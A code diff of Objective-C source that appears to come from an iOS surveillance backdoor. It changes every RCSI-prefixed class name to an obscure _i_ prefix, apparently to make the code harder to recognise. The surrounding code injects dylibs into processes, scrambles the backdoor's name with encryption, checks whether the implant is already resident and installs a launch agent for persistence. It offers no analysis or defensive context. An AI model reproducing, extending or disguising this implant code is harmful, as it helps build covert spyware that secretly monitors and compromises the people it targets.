@@ -38,7 +38,7 @@
 
 extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
 
-@interface RCSICore (hidden)
+@interface _i_Core (hidden)
 
 - (void)_guessNames;
 
@@ -57,7 +57,7 @@ extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
 #pragma mark Private Implementation
 #pragma mark -
 
-@implementation RCSICore (hidden)
+@implementation _i_Core (hidden)
 
 - (void)launchCtl:(char*)aDaemon command:(char*)aCommand
 {
@@ -169,13 +169,13 @@ extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
 
 - (BOOL)updateDylibConfigId
 {
-  RCSIDylibBlob *tmpBlob = [[RCSIDylibBlob alloc] initWithType:DYLIB_NEW_CONFID 
+  _i_DylibBlob *tmpBlob = [[_i_DylibBlob alloc] initWithType:DYLIB_NEW_CONFID 
                                                         status:1 
                                                     attributes:0 
                                                           blob:nil
-                                                      configId:[[RCSIConfManager sharedInstance] mConfigTimestamp]];
+                                                      configId:[[_i_ConfManager sharedInstance] mConfigTimestamp]];
   
-  [[RCSISharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
+  [[_i_SharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
   
   return TRUE;
 }
@@ -184,13 +184,13 @@ extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
 {  
   NSData *dylibName = [gDylibName dataUsingEncoding:NSUTF8StringEncoding];
   
-  RCSIDylibBlob *tmpBlob = [[RCSIDylibBlob alloc] initWithType:DYLIB_NEED_UNINSTALL 
+  _i_DylibBlob *tmpBlob = [[_i_DylibBlob alloc] initWithType:DYLIB_NEED_UNINSTALL 
                                                         status:1 
                                                     attributes:0 
                                                           blob:dylibName
                                                       configId:0];
   
-  [[RCSISharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
+  [[_i_SharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
     
   return TRUE;
 }
@@ -312,7 +312,7 @@ extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
   NSData *temp = [NSData dataWithBytes: gConfAesKey
                                 length: CC_MD5_DIGEST_LENGTH];
   
-  RCSIEncryption *_encryption = [[RCSIEncryption alloc] initWithKey: temp];
+  _i_Encryption *_encryption = [[_i_Encryption alloc] initWithKey: temp];
   gBackdoorName = [[[NSBundle mainBundle] executablePath] lastPathComponent];
   
   gBackdoorUpdateName = [_encryption scrambleForward: gBackdoorName
@@ -352,7 +352,7 @@ typedef struct _coreMessage_t
 - (void)refreshRemoteBlobs:(NSData*)aMessage
 {
   shMemoryLog *message = (shMemoryLog *)[aMessage bytes];
-  [[RCSISharedMemory sharedInstance] refreshRemoteBlobsToPid: message->flag];
+  [[_i_SharedMemory sharedInstance] refreshRemoteBlobsToPid: message->flag];
 }
 
 - (void)dispatchToLogManager:(NSData*)aMessage
@@ -360,8 +360,8 @@ typedef struct _coreMessage_t
   if (aMessage != nil) 
     {
       mach_port_t machPort = 
-          [[[RCSILogManager sharedInstance] notificationPort] machPort];
-      [RCSISharedMemory sendMessageToMachPort:machPort withData:aMessage];
+          [[[_i_LogManager sharedInstance] notificationPort] machPort];
+      [_i_SharedMemory sendMessageToMachPort:machPort withData:aMessage];
     }
 }
 
@@ -370,7 +370,7 @@ typedef struct _coreMessage_t
   if (aMessage != nil) 
     {
       mach_port_t machPort = [[eventManager notificationPort] machPort];
-      [RCSISharedMemory sendMessageToMachPort:machPort withData:aMessage];
+      [_i_SharedMemory sendMessageToMachPort:machPort withData:aMessage];
     }
 }
 
@@ -379,7 +379,7 @@ typedef struct _coreMessage_t
   if (aMessage != nil) 
     {
       mach_port_t machPort = [[actionManager notificationPort] machPort];
-      [RCSISharedMemory sendMessageToMachPort:machPort withData:aMessage];
+      [_i_SharedMemory sendMessageToMachPort:machPort withData:aMessage];
     }
 }
 
@@ -388,7 +388,7 @@ typedef struct _coreMessage_t
   if (aMessage != nil) 
     {
       mach_port_t machPort = [[agentManager notificationPort] machPort];
-      [RCSISharedMemory sendMessageToMachPort:machPort withData:aMessage];
+      [_i_SharedMemory sendMessageToMachPort:machPort withData:aMessage];
     }
 }
 
@@ -498,7 +498,7 @@ typedef struct _coreMessage_t
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
-  NSMutableArray *messages = [[RCSISharedMemory sharedInstance] fetchMessages];
+  NSMutableArray *messages = [[_i_SharedMemory sharedInstance] fetchMessages];
   
   int msgCount = [messages count];
   
@@ -537,7 +537,7 @@ typedef struct _coreMessage_t
 {
   [eventManager release];
   
-  eventManager = [[RCSIEventManager alloc] init];
+  eventManager = [[_i_EventManager alloc] init];
 
   if ([eventManager start] == TRUE)
     {
@@ -552,7 +552,7 @@ typedef struct _coreMessage_t
 {
   [actionManager release];
   
-  actionManager = [[RCSIActionManager alloc] init];
+  actionManager = [[_i_ActionManager alloc] init];
   
   if ([actionManager start] == TRUE)
     {  
@@ -567,7 +567,7 @@ typedef struct _coreMessage_t
 {
   [agentManager release];
   
-  agentManager = [[RCSIAgentManager alloc] init];
+  agentManager = [[_i_AgentManager alloc] init];
   
   if ([agentManager start] == TRUE)
     {  
@@ -668,7 +668,7 @@ typedef struct _coreMessage_t
 - (void)coreRunLoop
 { 
   // singleton object with the correct names of files
-  RCSIConfManager *configManager = [[RCSIConfManager alloc] initWithBackdoorName:
+  _i_ConfManager *configManager = [[_i_ConfManager alloc] initWithBackdoorName:
                                     [[[NSBundle mainBundle] executablePath] lastPathComponent]];
   
   if ([configManager checkConfiguration] == NO)
@@ -677,7 +677,7 @@ typedef struct _coreMessage_t
   // sound/vibrate in demo mode
   checkAndRunDemoMode();
   
-  RCSILogManager  *logManager = [RCSILogManager sharedInstance];
+  _i_LogManager  *logManager = [_i_LogManager sharedInstance];
   [logManager start];
   
   createInfoLog(@"Start");
@@ -700,7 +700,7 @@ typedef struct _coreMessage_t
       // first run and every new conf received
       if ([self shouldRestartModules] == TRUE)
         {
-          [[RCSISharedMemory sharedInstance] delBlobs];
+          [[_i_SharedMemory sharedInstance] delBlobs];
         
           if ([self startAgentManager]  == TRUE &&
               [self startActionManager] == TRUE && 
@@ -733,7 +733,7 @@ typedef struct _coreMessage_t
 #pragma mark Public Implementation
 #pragma mark -
 
-@implementation RCSICore
+@implementation _i_Core
 
 @synthesize mMainLoopControlFlag;
 @synthesize mUtil;
@@ -755,7 +755,7 @@ typedef struct _coreMessage_t
     
       [self _guessNames];
    
-      mUtil = [[RCSIUtils alloc] initWithBackdoorPath: [[NSBundle mainBundle] bundlePath]];
+      mUtil = [[_i_Utils alloc] initWithBackdoorPath: [[NSBundle mainBundle] bundlePath]];
     }
   
   return self;
@@ -781,7 +781,7 @@ typedef struct _coreMessage_t
 
   [self shouldUpgradeComponents];
 
-  [[RCSISharedMemory sharedInstance] createCoreRLSource];
+  [[_i_SharedMemory sharedInstance] createCoreRLSource];
   
   if ([self isBackdoorAlreadyResident] == FALSE)
       [self createLaunchAgentPlist];
